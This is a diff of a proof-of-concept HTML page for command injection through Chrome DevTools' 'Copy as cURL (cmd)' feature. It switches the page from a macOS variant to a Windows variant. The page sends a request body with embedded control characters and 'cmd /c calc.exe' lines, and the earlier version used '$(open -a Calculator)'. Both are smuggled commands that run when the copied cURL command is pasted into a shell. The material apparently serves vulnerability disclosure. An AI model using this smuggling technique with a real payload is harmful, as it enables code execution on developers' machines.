@@ -2,11 +2,13 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Copy as cURL PoC</title>
+  <title>Chrome DevTools Copy as cURL (cmd) PoC</title>
 </head>
 <body>
-  <h1>Copy as cURL PoC (iOS / macOS – non exploitable)</h1>
-  <button onclick="run()">Send Request</button>
+  <h2>Chrome DevTools Copy as cURL (cmd) – Windows PoC</h2>
+  <p>Click the button, then copy the request from DevTools.</p>
+
+  <button onclick="run()">Send PoC Request</button>
 
   <script>
     function run() {
@@ -15,9 +17,9 @@
         headers: {
           "Content-Type": "text/plain"
         },
-        body: "test\n$(open -a Calculator)\x0b$(open -a Calculator)\x0c"
+        body: "A\ncmd /c calc.exe\x0b\ncmd /c calc.exe\x0c"
       });
-      alert("Request sent. Check DevTools Network tab.");
+      alert("Request sent. Open DevTools → Network → copyme");
     }
   </script>
 </body>
